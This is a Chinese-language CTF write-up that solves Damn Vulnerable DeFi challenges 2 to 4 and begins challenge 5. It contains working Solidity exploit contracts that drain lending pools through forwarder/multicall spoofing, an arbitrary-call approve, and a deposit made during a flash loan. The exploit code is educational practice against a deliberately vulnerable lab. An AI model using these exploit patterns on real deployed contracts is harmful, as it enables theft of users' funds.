   bytes[] memory data = new bytes[](11);
   BasicForwarder.Request memory request;
   bytes memory signature;

   //---------------

   data[0] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[1] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[2] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[3] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[4] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[5] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[6] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[7] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[8] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[9] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(weth), 1e18, bytes("")));
   data[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (1010e18, payable(player))), deployer);

   //---------------

   request = BasicForwarder.Request({
      from: player,
      target: address(pool),
      value: 0,
      gas: 30000000,
      nonce: 0,
      data: abi.encodeCall(pool.multicall, (data)),
      deadline: type(uint256).max
   });

   //---------------

   bytes32 digest = keccak256(abi.encodePacked(
      "\x19\x01",
      forwarder.domainSeparator(),
      forwarder.getDataHash(request)
   ));

   (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);

   signature = abi.encodePacked(r, s, v);

   //---------------

   forwarder.execute(request, signature);
   weth.transfer(recovery, 1010e18);
}
```

- [DamnVulnerableDeFi-02-NaiveReceiver.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-02-NaiveReceiver.t.sol)

- 有點燒腦...

### 2024.09.14

- 繼續進行每日解一題挑戰
- 今天這一題 Truster 的解法比較簡單，解法也比較快
- 所以另外花了時間複習了一下昨天解題需要知道的 EIP712 標準


#### [DamnVulnerableDeFi-03] Truster

- 過關條件: 把 `TrusterLenderPool` 合約持有的 DVT 代幣餘額榨乾
  - [已知 `TrusterLenderPool` 有 100 萬顆 DVT 代幣](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/truster/Truster.t.sol#L36)
  - 並且沒有發給我們任何 DVT 代幣
  - 我們只能有 `TrusterLenderPool.flashLoan()` 函數可以呼叫
- 解法:
  - 這一題的合約代碼簡單許多，只有 `TrusterLenderPool.flashLoan()` 需要關注
  - 所以漏洞肯定藏在 `TrusterLenderPool.flashLoan()` 裡面
  - 但 `flashLoan()` 有個限制: 閃電貸之後，balance 必須大於 `balanceBefore`
    - 並且這個函數有重入保護
  - 所以唯一可疑的地方就在 [target.functionCall(data)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/truster/TrusterLenderPool.sol#L28) 了
  - 此處的 [target.functionCall(data)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/truster/TrusterLenderPool.sol#L28) 是一個非常明顯很不安全的作法
  - 一般來說，正常的閃電貸應該會是 callback 到調用者的 context 裡面，讓調用者(borrower)來決定拿到貸款後要做什麼操作
  - 可是這邊，很明顯的是**由 `TrusterLenderPool` 代為操作**
  - **即: `TrusterLenderPool` 存在任意代碼執行漏洞**
  - 所以我們現在知道，我們可以以 `TrusterLenderPool` 的身份，去執行我們想做的任意 Operations
  - 那麼現在問題在於，我們應該怎麼透過這個漏洞把 DVT token 偷走呢？有 `balanceBefore` 檢查耶
  - 答案就是利用 `ERC20.approve()`，讓 `TrusterLenderPool` 給我們的帳號授予 spender 轉帳權限就好了

- 先構造解答程式碼出來:

```solidity=
function test_truster() public checkSolvedByPlayer {
    uint256 amount = 1;
    address borrower = address(pool);
    address target = address(token);
    bytes memory data = abi.encodeWithSignature("approve(address,uint256)", player, type(uint256).max);
    pool.flashLoan(amount, borrower, target, data);
    token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
}
```

- 你會發現這時候執行 `forge test --match-path test/truster/Truster.t.sol  -vvvv` 是會得到 revert 的
- `[FAIL. Reason: Player executed more than one tx: 0 != 1] test_truster()`
- 因為題目要求我們必須只能用一個 transaction 來解答
- 但我們可以偷偷把 [assertEq(vm.getNonce(player), 1)](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/truster/Truster.t.sol#L67) 註解掉
- 再次執行，是會成功運行的，代表我們的漏洞利用思路是正確的
- 只差要把 Exploit 寫成一個 Contract，再丟去執行即可
- 所以我們再次修改 Exploit Code 即可

```
function test_truster() public checkSolvedByPlayer {
    new Exploit(token, pool, recovery, TOKENS_IN_POOL);
}

contract Exploit {
    constructor(DamnValuableToken token, TrusterLenderPool pool, address recovery, uint256 TOKENS_IN_POOL) {
        uint256 amount = 1;
        address borrower = address(pool);
        address target = address(token);
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        pool.flashLoan(amount, borrower, target, data);
        token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
    }
}
```

- [DamnVulnerableDeFi-03-Truster.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-03-Truster.t.sol)


### 2024.09.16

- 繼續進行每日解一題挑戰

#### [DamnVulnerableDeFi-04] Side Entrance

- 過關條件: 把 `SideEntranceLenderPool` 合約持有的 1000 顆 ETH 偷走，轉到 recovery 帳號
- 解法:
  - 這題有點水，直接講解法
  - 我們只要發起 `flashLoan()` 呼叫
  - 在 `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` 的 callback context 中，呼叫 `deposit()` 把閃電貸借款直接存進去
  - 因為 `SideEntranceLenderPool` 只是單純的檢查 `flashLoan()` 前與後的 balance，所以利用這種方式就可以讓我們憑空增加 `balances[msg.sender]`
  - 最後再呼叫 `withdraw()` 把 `SideEntranceLenderPool` 合約的 ETH 幹走即可

```solidity
function test_sideEntrance() public checkSolvedByPlayer {
    Exploit exp = new Exploit(pool, ETHER_IN_POOL);
    exp.start();
    payable(recovery).transfer(ETHER_IN_POOL);
}

contract Exploit {
    SideEntranceLenderPool pool;
    uint256 ETHER_IN_POOL;

    constructor(SideEntranceLenderPool _pool, uint256 _ETHER_IN_POOL) {
        pool = _pool;
        ETHER_IN_POOL = _ETHER_IN_POOL;
    }
    
    function start() external {
        pool.flashLoan(ETHER_IN_POOL);
        pool.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
```

- [DamnVulnerableDeFi-04-SideEntrance.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-04-SideEntrance.t.sol)


### 2024.09.18

- 繼續進行每日解一題挑戰 -> 挑戰失敗🥲
- 今天卡關，花了比較多時間在理解題目代碼
- 先把解題紀錄寫下來，明天繼續補

#### [DamnVulnerableDeFi-05] The Rewarder

- 過關條件:
  1. `TheRewarderDistributor` 合約的 DVT 代幣餘額低於 0.01 顆
  2. `TheRewarderDistributor` 合約的 WETH 代幣餘額低於 0.001 顆
  3. 上述資產都被轉到 `recovery` 帳號
- 解法
  - 這一題的知識背景主要是 Bitmaps
  - 還有 Merkle Tree
  - 已知 Claimable Leaves 是 `/test/the-rewarder/dvt-distribution.json` 與 `/test/the-rewarder/weth-distribution.json` 紀錄的內容
    - 每個 Leaf 存在 `address` 和可領取的 `amount` 元素
    - `bytes32 leaf = keccak256(abi.encodePacked(address, amount));`
    - 誰左誰右基本上是看 leaf 值誰大誰小
  - `player` 地址也有少量可領取的 distribution (見下方第一段程式碼)
  - 要達成過關條件，我第一個想到的是有沒有透過 `clean(IERC20[] calldata tokens)` 做到
    - 但我們必須要使 `distributions` 全部被發出去
  - 我們操縱的錢包，被限制在只能使用 `player`，所以沒辦法直接利用
    - 所以通過 `if (distributions[token].remaining == 0)` 基本上沒可能了，畢竟我們只能 claim `player` 的微量 distributions
  - 在 `createDistribution()` 身上搞事也沒辦法，因為要把 DVT, WETH 偷走，想搞事會遇到 `if (distributions[token].remaining != 0) revert StillDistributing();` 語句
  - 那麼可以搞事的地方就剩下 `claimRewards()` 了
  - 首先好奇的地方是: `claimReward()` 是如何判斷一個錢包地址已經 Claim 過了？有沒有可能存在 Double Claim 的可能性？
  - 

```solidity=
function test_theRewarder() public checkSolvedByPlayer {
    console.log(player); // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
}
```



<!-- Content_END -->